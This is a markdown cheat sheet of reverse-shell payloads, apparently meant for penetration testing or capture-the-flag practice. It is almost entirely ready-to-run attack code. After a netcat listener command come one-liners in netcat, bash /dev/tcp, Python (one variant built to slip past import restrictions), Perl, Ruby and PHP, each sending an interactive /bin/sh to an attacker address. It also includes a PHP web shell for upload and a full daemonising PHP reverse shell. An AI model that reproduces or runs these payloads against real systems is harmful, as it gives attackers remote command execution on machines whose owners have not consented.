# Reverse Shell

- [How To?](#how-to?)
- [Netcat](#netcat)
- [Bash](#bash)
- [Python](#python)
- [Perl](#perl)
- [Ruby](#ruby)
- [PHP](#php)

# How to?

All the reverse shell you found below is use on your target. There is some I include which is not a reverse shell but it could help us to get a RCE .Also, on your machine please make sure to listen like below:

```
nc -lnvp 9001
```

So while listen you will try to run the listed reverse shell below on your target and hopefully you will get a shell :)

### Netcat

```
# Option 1
nc -e /bin/sh 10.10.10.10 9001

# Option 2
nc 10.10.10.10 9001 -e /bin/sh

# Option 3
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

### Bash

```
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

### Python

When you need to run without a file.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

When you need to run with a file. You can save it as shell.py.
```
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

When you only have python3 only.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

When import have been secured.
```
socket = __import__("socket")
subprocess = __import__("subprocess")
os = __import__("os")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Perl

When you need to run without a file.
```
perl -e 'use Socket;$i="10.10.10.10";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

When you need to run with a file. You can save it as shell.pl.
```
use Socket

$i="10.10.10.10";
$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}
```

### Ruby

When you need to run without a file.
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10",9001);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

When you need to run with a file. You can save it as shell.rb
```
require 'socket'

c=TCPSocket.new("10.10.10.10",9001)

while(cmd=c.gets)
    IO.popen(cmd,"r"){
        |io|c.print io.read
    }
end
```

### PHP

When you need to run without a file.
```
php -r '$sock=fsockopen("10.10.10.10",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Remote Execution Code:
```
# Create and upload
echo '<?php system($_GET["c"]);?>'>c.php

# To use (go to that directory)
http://10.10.48.9/uploads/c.php?c=whoami
```

When you need to run with a file. You can save it as shell.php. Option 1:
```
<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f');
?>
```

When you need to run with a file. You can save it as shell.php. Option 2:
```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"), 
   2 => array("pipe", "w")  
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
```
